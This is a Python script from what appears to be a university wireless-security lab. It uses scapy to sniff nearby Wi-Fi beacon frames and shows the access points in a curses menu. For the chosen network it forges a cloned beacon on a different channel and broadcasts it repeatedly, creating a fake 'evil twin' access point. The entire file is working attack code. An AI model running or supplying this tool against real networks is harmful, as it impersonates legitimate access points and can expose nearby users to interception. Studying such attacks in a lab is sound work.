# Source:
# - https://gist.github.com/securitytube/5291959
# - https://stackoverflow.com/questions/16748083/suppress-print-without-b-prefix-for-bytes-in-python-3
# - https://www.w3schools.com/python/python_dictionaries.asp
# - https://stackoverflow.com/questions/4256107/running-bash-commands-in-python
# - https://raspberrypi.stackexchange.com/questions/13099/packet-sniffing-with-channel-hopping-using-scapy
# - https://fr.wikibooks.org/wiki/Programmation_Python/Les_threads
# - https://stackoverflow.com/questions/2408560/python-nonblocking-console-input (Mickey Chan answer)
# - https://www.w3schools.com/python/python_arrays.asp
# - https://stackoverflow.com/questions/18018033/how-to-stop-a-looping-thread-in-python
# - https://gist.github.com/thepacketgeek/6876699
# - https://www.quora.com/How-can-I-use-the-null-terminated-characters-in-a-Python-string
# - https://stackoverflow.com/questions/26826417/how-can-i-find-with-scapy-wireless-networks-around
# - https://www.youtube.com/watch?v=zwMsmBsC1GM&t=1117s
# - https://stackoverflow.com/questions/22670510/wireless-data-packet-capturing-with-help-of-scapy
# - https://stackoverflow.com/questions/29817417/scapy-insert-packet-layer-between-two-other-layers + Edin Mujkanovic
#
# Author: Victor Truan, Jerome Bagnoud | SWI - Labo 01

import argparse
import curses
from scapy.all import *

apList = []
BROADCAST_MAC_ADDRESS = "FF:FF:FF:FF:FF:FF"
selectedAP = 0

# Arguments
parser = argparse.ArgumentParser(description="This script is used to detect nearby SSID and display them, and then when the user choose one of the SSID, it create a fake AP by spamming Beacon Frame advertising the same SSID")
parser.add_argument("-i", "--interface", required=True, help="the interface to use")
parser.add_argument("-n", "--number", default=0, type=int, help="the number of fake probe response to send")
parser.add_argument("-s", "--source", type=str, help="the source address")
parser.add_argument("-d", "--destination", default=BROADCAST_MAC_ADDRESS, type=str, help="the destination address")

arguments = parser.parse_args()

def displayAPList(stdscr, selectedAP):
    stdscr.clear()

    stdscr.addstr(0,0,"Choose a Wifi AP to begin the attack")
    stdscr.refresh()

    stdscr.addstr(2,0,"SSID          Channel         Power")
    stdscr.refresh()

    i = 4

    for element in apList:
        apName = element.info.decode()
        # Source: https://www.quora.com/How-can-I-use-the-null-terminated-characters-in-a-Python-string
        # Some people were having strange SSID name so we get rid of all special char (\x00, etc...)
        apName = apName.rstrip("\x00\n")

        if(apName == ""):
            apName = "Hidden SSID"
        
        try:
            channel = str(ord(element[Dot11Elt][2].info))
            signal = str(element.dBm_AntSignal)
        except:
            channel = "Unknown"
            signal = "Unknown"

        textToDisplay = str(apList.index(element) + 1) + ") " + apName + " - CH " + channel + "  " + signal + " dBm"

        if(apList.index(element) == selectedAP):
            stdscr.attron(curses.color_pair(1))
            stdscr.addstr(i, 0, textToDisplay)
            stdscr.attroff(curses.color_pair(1))
        else:
            stdscr.addstr(i, 0, textToDisplay)
        
        i += 1

    stdscr.refresh()

# We use a nested function in order to pass argument to the sniff() callback function, source: https://gist.github.com/thepacketgeek/6876699
def packetHandling(stdscr):
    # This function verifiy if the packet is a management frame (more specifically a BeaconFrame), and read all necessary information from the packet (SSID, channel, etc...)
    def detectSSID(packet):
        global selectedAP

        keyPressed = stdscr.getch()

        if(keyPressed == curses.KEY_UP and selectedAP > 0):
            selectedAP -= 1
        elif(keyPressed == curses.KEY_DOWN and selectedAP < len(apList)):
            selectedAP += 1
        elif(keyPressed == curses.KEY_ENTER or keyPressed in [10, 13]):
            stdscr.clear()
            fakeProbe(selectedAP + 1, stdscr)

        # We want to gather only BeaconFrame (type Management: 0 and sub type BeaconFrame: 8)
        if(packet.haslayer(Dot11Beacon)):
            if(packet.type == 0 and packet.subtype == 8):
                found = False

                # Searching if the AP is already in the list
                for p in apList:
                    if(p.info.decode() == packet.info.decode()):
                        found = True
                        break
                
                if(not found):
                    apList.append(packet)
                    # Source: https://stackoverflow.com/questions/26826417/how-can-i-find-with-scapy-wireless-networks-around

                displayAPList(stdscr, selectedAP)

    return detectSSID

def fakeProbe(apNumber, stdscr):
    currentPacket = apList[int(apNumber) - 1]

    # Changing channel to the one of the real AP + 6
    newChannel = ((ord(currentPacket[Dot11Elt][2].info.decode()) + 5) % 13) + 1

    if(arguments.source is None):
        newAdress = currentPacket.addr2
    else:
        newAdress = arguments.source

    # Crafting and sending the probe response
    fakeBeacon = currentPacket
    fakeBeacon.addr2 = newAdress
    fakeBeacon.addr3 = newAdress

    tmp1 = fakeBeacon.getlayer(6)
    fakeBeacon.getlayer(4).remove_payload()

    # We are basically splitting the packet, removing the 'DSset' Dot11Elt layer and replacing it with a new crafted one
    modifiedBeacon = fakeBeacon / Dot11Elt(ID="DSset", info=chr(newChannel)) / tmp1
    fakeBeacon = modifiedBeacon

    stdscr.addstr(0,0,"Sending fake Beacon Frame for SSID " + currentPacket.info.decode())
    stdscr.refresh()

    if(arguments.number != 0):
        for i in range(0, arguments.number):
            sendp(fakeBeacon, iface=arguments.interface, verbose=False)
    # If the paramater '-n' is not set (or set to 0), we do an infinite while, until the user exit the script
    else:
        while 1:
            sendp(fakeBeacon, iface=arguments.interface, verbose=False)

def main(stdscr):
    # Avoid echoing the character typed and avoid delay for displaying things with curses library
    curses.noecho()
    stdscr.nodelay(1)

    displayAPList(stdscr, 0)

    # Set the color for selected AP in the AP list
    curses.init_pair(1, curses.COLOR_BLACK, curses.COLOR_WHITE)

    # begin to sniff, passing every packet collected to the packetHandling function
    a = sniff(iface=arguments.interface, prn=packetHandling(stdscr))

# Avoid bug with curses library while exiting the programm abruptely
curses.wrapper(main)
